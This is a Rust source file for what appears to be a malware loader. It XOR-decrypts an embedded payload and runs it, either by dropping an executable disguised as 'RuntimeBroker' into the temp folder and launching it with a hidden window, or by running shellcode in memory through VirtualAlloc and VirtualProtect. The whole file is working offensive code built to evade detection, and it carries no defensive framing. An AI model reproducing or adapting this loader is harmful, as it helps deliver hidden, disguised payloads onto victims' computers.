//! Payload Execution Module
//!
//! This module supports two execution modes:
//! 1. SHELLCODE mode: Execute XOR-encrypted shellcode in memory (requires donut)
//! 2. AGENT mode: Drop and execute XOR-encrypted agent.exe (simpler, recommended)
//!
//! The mode is determined by the EXECUTION_MODE constant in config.rs

use crate::config::{ENCRYPTED_AGENT, ENCRYPTED_SHELLCODE, EXECUTION_MODE};

/// Execute the embedded payload based on the configured mode
#[cfg(target_os = "windows")]
pub fn execute_shellcode() -> Result<(), Box<dyn std::error::Error>> {
    // Use runtime function to get XOR key (supports binary patching)
    let xor_key = crate::config::get_xor_key();

    if EXECUTION_MODE == 1 && !ENCRYPTED_AGENT.is_empty() {
        // Agent mode: drop and execute
        execute_agent_mode(xor_key)
    } else if !ENCRYPTED_SHELLCODE.is_empty() {
        // Shellcode mode: in-memory execution
        execute_shellcode_mode(xor_key)
    } else {
        Err("No payload embedded".into())
    }
}

/// Execute embedded agent.exe (recommended mode)
/// This is simpler and doesn't require donut
#[cfg(target_os = "windows")]
fn execute_agent_mode(xor_key: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    use obfstr::obfstr;
    use std::fs::File;
    use std::io::Write;
    use std::os::windows::process::CommandExt;
    use std::process::Command;

    // Decrypt agent
    let agent_bytes = xor_decrypt(ENCRYPTED_AGENT, xor_key);

    // Create temp file with random name that looks legitimate
    let temp_dir = std::env::temp_dir();
    let random_suffix: u32 = rand::random();
    let exe_name = format!("{}_{}.exe", obfstr!("RuntimeBroker"), random_suffix);
    let exe_path = temp_dir.join(&exe_name);

    // Write decrypted agent
    let mut file = File::create(&exe_path)?;
    file.write_all(&agent_bytes)?;
    drop(file);

    // Execute agent in background (hidden window)
    // CREATE_NO_WINDOW = 0x08000000
    Command::new(&exe_path).creation_flags(0x08000000).spawn()?;

    Ok(())
}

/// Execute shellcode in memory (legacy mode, requires donut)
#[cfg(target_os = "windows")]
fn execute_shellcode_mode(xor_key: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    use std::ptr;
    use winapi::shared::minwindef::DWORD;
    use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
    use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};

    // Decrypt shellcode in memory
    let shellcode = xor_decrypt(ENCRYPTED_SHELLCODE, xor_key);

    // Allocate memory with RW permissions
    let shellcode_len = shellcode.len();
    let mem = unsafe {
        VirtualAlloc(
            ptr::null_mut(),
            shellcode_len,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if mem.is_null() {
        return Err("VirtualAlloc failed".into());
    }

    // Copy shellcode to allocated memory
    unsafe {
        ptr::copy_nonoverlapping(shellcode.as_ptr(), mem as *mut u8, shellcode_len);
    }

    // Change memory protection to RX (Read + Execute)
    let mut old_protect: DWORD = 0;
    let result = unsafe { VirtualProtect(mem, shellcode_len, PAGE_EXECUTE_READ, &mut old_protect) };

    if result == 0 {
        return Err("VirtualProtect failed".into());
    }

    // Execute shellcode
    let shellcode_fn: extern "C" fn() = unsafe { std::mem::transmute(mem) };
    shellcode_fn();

    Ok(())
}

/// Decrypt data using XOR (same key as encryption)
fn xor_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, &byte)| byte ^ key[i % key.len()])
        .collect()
}

#[cfg(not(target_os = "windows"))]
pub fn execute_shellcode() -> Result<(), Box<dyn std::error::Error>> {
    Err("Payload execution only supported on Windows".into())
}
